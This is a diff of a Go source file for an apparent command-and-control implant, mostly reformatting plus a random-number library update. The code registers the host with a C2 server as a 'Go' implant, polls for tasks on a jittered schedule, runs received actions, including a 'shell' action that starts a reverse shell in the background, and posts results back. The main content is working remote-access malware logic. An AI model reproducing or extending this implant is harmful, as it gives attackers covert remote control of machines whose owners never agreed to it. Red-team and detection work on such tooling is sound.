@@ -1,40 +1,40 @@
 package main
 
 import (
-	"fmt"
-	"runtime"
-	"os/exec"
-	"net"
-	"strings"
-	"net/http"
-    "time"
-	"encoding/json"
 	"bytes"
-	"math/rand"
+	"encoding/json"
+	"fmt"
+	"math/rand/v2"
+	"net"
+	"net/http"
+	"os/exec"
+	"runtime"
+	"strings"
+	"time"
 )
 
 type Agent struct {
-    LocalIP          string
-    ServerIP         string
-    ServerPort       int
+	LocalIP          string
+	ServerIP         string
+	ServerPort       int
 	CallbackInterval int
-	Jitter 			 int
-	Debug			 bool
+	Jitter           int
+	Debug            bool
 	Client           *http.Client
 }
 
 type Task struct {
-	Action string `json:"action"`
-	Input string `json:"input"`
-	Input2 string `json:"input2"`
+	Action string      `json:"action"`
+	Input  string      `json:"input"`
+	Input2 string      `json:"input2"`
 	TaskID json.Number `json:"task_id"`
 }
 
 type Result struct {
-	AgentID string `json:"agent_id"`
-	TaskID string `json:"task_id"`
-	Result string `json:"result"`
-	ReturnCode int `json:"returncode"`
+	AgentID    string `json:"agent_id"`
+	TaskID     string `json:"task_id"`
+	Result     string `json:"result"`
+	ReturnCode int    `json:"returncode"`
 }
 
 func getLocalIP() string {
@@ -63,31 +63,31 @@ func getLocalIP() string {
 }
 
 func (agent *Agent) Register() error {
-    data := map[string]string{
-        "agent_id": agent.LocalIP,
-		"os": runtime.GOOS,
+	data := map[string]string{
+		"agent_id":     agent.LocalIP,
+		"os":           runtime.GOOS,
 		"implant_type": "Go",
-    }
-    jsonData, err := json.Marshal(data)
-    if err != nil {
-        return fmt.Errorf("failed to marshal JSON: %w", err)
-    }
-    req, err := http.NewRequest("POST", fmt.Sprintf("http://%s:%d/register", agent.ServerIP, agent.ServerPort), bytes.NewBuffer(jsonData))
-    if err != nil {
-        return fmt.Errorf("failed to create request: %w", err)
-    }
-    req.Header.Set("Content-Type", "application/json")
+	}
+	jsonData, err := json.Marshal(data)
+	if err != nil {
+		return fmt.Errorf("failed to marshal JSON: %w", err)
+	}
+	req, err := http.NewRequest("POST", fmt.Sprintf("http://%s:%d/register", agent.ServerIP, agent.ServerPort), bytes.NewBuffer(jsonData))
+	if err != nil {
+		return fmt.Errorf("failed to create request: %w", err)
+	}
+	req.Header.Set("Content-Type", "application/json")
 
-    resp, err := agent.Client.Do(req)
-    if err != nil {
-        return fmt.Errorf("failed to send request: %w", err)
-    }
-    defer resp.Body.Close()
+	resp, err := agent.Client.Do(req)
+	if err != nil {
+		return fmt.Errorf("failed to send request: %w", err)
+	}
+	defer resp.Body.Close()
 
-    if resp.StatusCode != 201 && resp.StatusCode != 200 {
-        return fmt.Errorf("unexpected status code: %d", resp.StatusCode)
-    }
-    return nil
+	if resp.StatusCode != 201 && resp.StatusCode != 200 {
+		return fmt.Errorf("unexpected status code: %d", resp.StatusCode)
+	}
+	return nil
 }
 
 func (agent *Agent) HandleTask(task Task) (Result, error) {
@@ -107,14 +107,14 @@ func (agent *Agent) HandleTask(task Task) (Result, error) {
 			result.ReturnCode = 0
 		}
 	case "shell":
-		go RevShell(task.Input) 
+		go RevShell(task.Input)
 		result.Result = "Interactive shell started in background"
 		result.ReturnCode = 0
 	default:
 		return result, fmt.Errorf("Undefined action in JSON: %s", task.Action)
 	}
-	if agent.Debug{
-		fmt.Printf("Result: %s",result)
+	if agent.Debug {
+		fmt.Printf("Result: %s", result.Result)
 	}
 	return result, nil
 }
@@ -126,32 +126,31 @@ func (agent *Agent) Sleep() {
 	}
 	maxSleep := agent.CallbackInterval + agent.Jitter
 
-	sleepTime := rand.Intn(maxSleep-minSleep+1) + minSleep //random sleep time between min and max sleep time
+	sleepTime := rand.IntN(maxSleep-minSleep+1) + minSleep //random sleep time between min and max sleep time
 	if agent.Debug {
 		fmt.Printf("Sleeping for %d seconds...\n", sleepTime)
 	}
 	time.Sleep(time.Duration(sleepTime) * time.Second)
 }
 
-func main(){
-	rand.Seed(time.Now().UnixNano())
+func main() {
 	agent := Agent{
-        LocalIP:  getLocalIP(),
-        ServerIP: "127.0.0.1",
-        ServerPort: 80,
+		LocalIP:          getLocalIP(),
+		ServerIP:         "127.0.0.1",
+		ServerPort:       80,
 		CallbackInterval: 15,
-		Jitter: 5,
-		Debug: true,
+		Jitter:           5,
+		Debug:            true,
 		Client: &http.Client{
-            Timeout: 10 * time.Second,
-        },
-    }
+			Timeout: 10 * time.Second,
+		},
+	}
 
 	// Attempt to register the agent with C2 server until successful
 	for {
 		err := agent.Register()
 		if err != nil {
-			if agent.Debug{
+			if agent.Debug {
 				fmt.Println("Error registering agent:", err)
 			}
 			agent.Sleep()
@@ -172,41 +171,41 @@ func main(){
 		}
 		req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
 		if err != nil {
-			if agent.Debug{
+			if agent.Debug {
 				fmt.Println("Error creating request:", err)
 			}
 			agent.Sleep()
 			continue
 		}
 		req.Header.Set("Content-Type", "application/json")
-		resp,err := agent.Client.Do(req)
+		resp, err := agent.Client.Do(req)
 		if err != nil {
-			if agent.Debug{
+			if agent.Debug {
 				fmt.Println("Error sending request:", err)
 			}
 			agent.Sleep()
 			continue
 		}
 		if resp.StatusCode == 418 {
-            agent.Register()
-            continue
-        }
-        if resp.StatusCode != 200 && resp.StatusCode != 201 && resp.StatusCode != 204 {
-			if agent.Debug{
+			agent.Register()
+			continue
+		}
+		if resp.StatusCode != 200 && resp.StatusCode != 201 && resp.StatusCode != 204 {
+			if agent.Debug {
 				fmt.Printf("Unexpected status code: %d\n", resp.StatusCode)
 			}
-            agent.Sleep()
-            continue
-        } else if resp.StatusCode == 204 {
-            // No tasks
-            agent.Sleep()
-            continue
-        }
+			agent.Sleep()
+			continue
+		} else if resp.StatusCode == 204 {
+			// No tasks
+			agent.Sleep()
+			continue
+		}
 
 		var task Task
 		err = json.NewDecoder(resp.Body).Decode(&task)
 		if err != nil {
-			if agent.Debug{
+			if agent.Debug {
 				fmt.Println("Error decoding JSON:", err)
 			}
 			agent.Sleep()
@@ -214,7 +213,7 @@ func main(){
 		}
 		result, err := agent.HandleTask(task)
 		if err != nil {
-			if agent.Debug{
+			if agent.Debug {
 				fmt.Println("Error handling task:", err)
 			}
 			agent.Sleep()
@@ -224,7 +223,7 @@ func main(){
 		url = fmt.Sprintf("http://%s:%d/results", agent.ServerIP, agent.ServerPort)
 		jsonData, err = json.Marshal(result)
 		if err != nil {
-			if agent.Debug{
+			if agent.Debug {
 				fmt.Println("Error marshaling JSON:", err)
 			}
 			agent.Sleep()
@@ -232,7 +231,7 @@ func main(){
 		}
 		req, err = http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
 		if err != nil {
-			if agent.Debug{
+			if agent.Debug {
 				fmt.Println("Error creating request:", err)
 			}
 			agent.Sleep()
@@ -241,14 +240,14 @@ func main(){
 		req.Header.Set("Content-Type", "application/json")
 		resp, err = agent.Client.Do(req)
 		if err != nil {
-			if agent.Debug{
+			if agent.Debug {
 				fmt.Println("Error sending request:", err)
 			}
 			agent.Sleep()
 			continue
 		}
 		if resp.StatusCode != 200 && resp.StatusCode != 201 && resp.StatusCode != 204 {
-			if agent.Debug{
+			if agent.Debug {
 				fmt.Printf("Unexpected status code: %d\n", resp.StatusCode)
 			}
 			agent.Sleep()
